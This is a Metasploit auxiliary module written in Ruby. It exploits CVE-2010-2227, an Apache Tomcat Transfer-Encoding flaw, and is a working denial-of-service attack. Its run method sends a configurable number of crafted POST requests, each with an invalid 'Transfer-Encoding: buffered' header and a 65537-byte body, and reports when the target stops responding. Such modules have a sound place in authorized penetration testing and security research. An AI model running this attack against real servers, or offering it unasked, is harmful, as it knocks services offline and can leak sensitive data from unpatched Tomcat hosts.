##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Tomcat Transfer-Encoding Information Disclosure and DoS',
      'Description'    => %q{
          Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27, and 7.0.0 beta does not
        properly handle an invalid Transfer-Encoding header, which allows remote attackers
        to cause a denial of service (application outage) or obtain sensitive information
        via a crafted header that interferes with "recycling of a buffer."
      },
      'Author'         =>
        [
          'Steve Jones', # original discoverer
          'Hoagie <andi[at]void.at>', # original public exploit
          'Paulino Calderon <calderon[at]websec.mx>', # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-2227' ],
          [ 'OSVDB', '66319' ],
          [ 'BID', '41544' ]
        ],
      'DisclosureDate' => 'Jul 09 2010'))

    register_options(
      [
        Opt::RPORT(8000),
        OptInt.new('RLIMIT', [ true,  "Number of requests to send", 25])
      ])
  end

  def run
    for x in 1..datastore['RLIMIT']
      begin
        connect
        print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")

        sploit = "POST / HTTP/1.1\r\n"
        sploit << "Host: " + rhost + "\r\n"
        sploit << "Transfer-Encoding: buffered\r\n"
        sploit << "Content-Length: 65537\r\n\r\n"
        sploit << Rex::Text.rand_text_alpha(1) * 65537

        sock.put(sploit + "\r\n\r\n")
        disconnect

        print_error("DoS packet unsuccessful")
      rescue ::Rex::ConnectionRefused
        print_error("Unable to connect to #{rhost}:#{rport}")
      rescue ::Errno::ECONNRESET
        print_good("DoS packet successful. #{rhost} not responding.")
      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        print_error("Couldn't connect to #{rhost}:#{rport}")
      rescue ::Timeout::Error, ::Errno::EPIPE
      end
    end
  end
end
